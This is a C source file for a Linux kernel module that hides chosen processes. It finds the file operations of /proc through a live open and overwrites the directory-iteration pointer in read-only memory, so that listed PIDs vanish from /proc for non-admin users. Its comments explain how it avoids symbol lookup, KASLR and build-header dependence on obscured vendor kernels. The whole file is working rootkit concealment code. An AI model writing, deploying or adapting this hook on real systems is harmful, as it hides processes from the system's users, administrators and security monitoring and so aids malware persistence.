#include "memd_syshook.h"
#include "memd_hide.h"
#include "memd_learn.h"
#include "memd_utils.h"

#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/version.h>

/* One filldir actor for every kernel: int (pre-6.1) vs bool (6.1+) only
 * differ in type, not ABI — 0/continue and 1/stop share the same w0
 * values, and the wrapped kernel actor only ever returns 0/1. */
typedef int hide_filldir_ret_t;
#define HIDE_FILLDIR_OK 0
#define HIDE_FILLDIR_FULL 1
#include <linux/module.h>
#include <linux/spinlock.h>
#include <linux/uidgid.h>

/* filp_open lives in a gated namespace; import it explicitly (any module
 * may, it just has to say so). Without this the loader rejects the
 * module (EINVAL), even though the symbol exists. */
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);

/* VFS readdir hook for /proc pid hiding.
 *
 * Why not sys_call_table: on obscured OEM kernels the table is not
 * discoverable by content (no 400+ plain run anywhere; text unreadable
 * so targets can't be validated; KASLR re-slides every boot). The
 * file_operations of /proc need NO discovery: open /proc, read f_op,
 * swap one pointer. Narrower blast radius (/proc only, not every
 * filesystem), arch-independent (covers 32-bit readers too), no
 * KASLR dependence, no per-build data.
 *
 * Install is explicit via ioctl (userspace gates on CFI status first:
 * on enforcing kernels the indirect f_op call would trap, so install
 * is refused there by policy). The table write uses the guarded
 * RO-safe writer (verify-before-write, readback, exact restore).
 * rmmod always restores first (a dangling f_op pointer after unload
 * would panic the next /proc listing).
 */

typedef int (*iterate_shared_fn)(struct file *filp, struct dir_context *ctx);

#include "memd_netlayout.h"

/* iterate_shared slot: 64 generally, 56 on 6.6 (iterate removed there).
 * Resolved by running generation — never trust build headers here. */
static int memd_iter_off(void)
{
    return memd_net_gen() == MEMD_GEN_66 ? 56 : 64;
}

static unsigned long memd_iter_get(const struct file_operations *ops)
{
    unsigned long v = 0;
    memd_safe_read64((void *)((const char *)ops + memd_iter_off()), &v);
    return v;
}

struct hide_ctx {
    struct dir_context base;
    struct dir_context *orig;
};

static const struct file_operations *hooked_ops;
static iterate_shared_fn orig_iterate;
static int hook_active;
static DEFINE_SPINLOCK(syshook_lock);

static bool name_is_hidden_pid(const char *name, int namlen)
{
    unsigned long v = 0;
    int i;

    if (namlen <= 0 || namlen > 7)
        return false;
    for (i = 0; i < namlen; i++) {
        if (name[i] < '0' || name[i] > '9')
            return false;
        v = v * 10 + (unsigned int)(name[i] - '0');
    }
    return memd_hide_contains((pid_t)v);
}

static hide_filldir_ret_t hide_filldir(struct dir_context *ctx,
                                         const char *name, int namlen,
                                         loff_t offset, u64 ino,
                                         unsigned int d_type)
{
    struct hide_ctx *hc = container_of(ctx, struct hide_ctx, base);
    filldir_t orig_actor;
    hide_filldir_ret_t ret;

    (void)offset;
    (void)ino;
    (void)d_type;
    if (name_is_hidden_pid(name, namlen))
        return HIDE_FILLDIR_OK; /* skip: not emitted, iteration continues */
    orig_actor = hc->orig->actor;
    ret = orig_actor(hc->orig, name, namlen, offset, ino, d_type);
    return ret;
}

static int memd_iterate_shared(struct file *filp, struct dir_context *ctx)
{
    iterate_shared_fn orig;
    struct hide_ctx hc;
    int ret;
    bool held = false;

    orig = READ_ONCE(orig_iterate);
    if (!orig)
        return -ENOSYS;
    /* Privileged sees everything (debugging); everyone else gets
     * filtered. memd_capable() reads creds via the LEARNED offset —
     * never build headers (capable()/current_euid() inline the wrong
     * task->cred on foreign kernels = crash). */
    if (memd_capable(CAP_SYS_ADMIN))
        return orig(filp, ctx);
    if (!try_module_get(THIS_MODULE))
        return orig(filp, ctx); /* teardown race: passthrough, never crash */
    held = true;
    hc.base = *ctx;
    /* Explicit cast: int (pre-6.1) vs bool (6.1+) actors share the 0/1
     * w0 ABI, but 6.x headers reject the implicit conversion (hard
     * error). The cast keeps one actor compiling on every header. */
    hc.base.actor = (filldir_t)(void *)hide_filldir;
    hc.orig = ctx;
    ret = orig(filp, &hc.base);
    ctx->pos = hc.base.pos;
    if (held)
        module_put(THIS_MODULE);
    return ret;
}

int memd_hide_install(void)
{
    struct file *f;
    const struct file_operations *ops;
    iterate_shared_fn orig;
    unsigned long flags;

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    spin_unlock_irqrestore(&syshook_lock, flags);

    /* Resolve the ops from a live open: no symbols, no scans, no tables,
     * no KASLR dependence. */
    f = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0);
    if (IS_ERR(f)) {
        memd_err("hide install: filp_open /proc failed: %ld\n", PTR_ERR(f));
        return PTR_ERR(f) < 0 ? (int)PTR_ERR(f) : -ENOENT;
    }
    ops = memd_file_fop(f);
    filp_close(f, NULL);
    if (!ops || !memd_iter_get(ops)) {
        memd_err("hide install: no f_op/iterate (ops=%px)\n", ops);
        return -ENOSYS;
    }
    orig = (iterate_shared_fn)memd_iter_get(ops);
    memd_err("hide install: f_op=%px iterate=%px\n", ops, orig);

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    /* RO-safe write (guarded, verified). State commits ONLY on verified
     * install: failure paths never lose orig and never report inactive
     * while hooked (retryable + honest, never dangling-silent). */
    {
        int wr;
        wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                                (unsigned long)memd_iterate_shared);
        if (wr) {
            memd_err("hide install: table write failed: %d\n", wr);
            spin_unlock_irqrestore(&syshook_lock, flags);
            return -EIO;
        }
    }
    {
        iterate_shared_fn back = NULL;
        back = (iterate_shared_fn)memd_iter_get(ops);
        if (!back || back != memd_iterate_shared) {
            memd_err("hide install: readback mismatch\n");
            /* Best-effort restore to original (runtime offset, not
             * compiled: 6.6 moved this slot). Verify it. */
            if (!memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                                    (unsigned long)orig)) {
                back = (iterate_shared_fn)memd_iter_get(ops);
                if (back && back == orig) {
                    spin_unlock_irqrestore(&syshook_lock, flags);
                    return -EIO;
                }
            }
            /* Restore unverified: keep hooked (orig intact) so a later
             * uninstall can retry — never clear into a dangling hook. */
            hooked_ops = ops;
            orig_iterate = orig;
            hook_active = 1;
            spin_unlock_irqrestore(&syshook_lock, flags);
            return -EIO;
        }
    }
    hooked_ops = ops;
    orig_iterate = orig;
    hook_active = 1;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return 0;
}

int memd_hide_uninstall(void)
{
    unsigned long flags;
    const struct file_operations *ops;
    iterate_shared_fn orig;

    spin_lock_irqsave(&syshook_lock, flags);
    if (!hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    ops = hooked_ops;
    orig = orig_iterate;
    /* Restore + verify. On ANY failure keep hooked/orig/active (honest +
     * retryable) — clearing into an unverified f_op would dangle-silent
     * (/proc empty for non-root, NULL call for root). Only a verified
     * restore clears state. */
    if (memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                           (unsigned long)orig)) {
        memd_err("hide uninstall: table write failed\n");
        spin_unlock_irqrestore(&syshook_lock, flags);
        return -EIO;
    }
    {
        iterate_shared_fn back = NULL;
        back = (iterate_shared_fn)memd_iter_get(ops);
        if (!back || back != orig) {
            memd_err("hide uninstall: readback mismatch\n");
            spin_unlock_irqrestore(&syshook_lock, flags);
            return -EIO;
        }
    }
    hooked_ops = NULL;
    orig_iterate = NULL;
    hook_active = 0;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return 0;
}

int memd_hide_active(void)
{
    int a;
    unsigned long flags;

    spin_lock_irqsave(&syshook_lock, flags);
    a = hook_active;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return a;
}
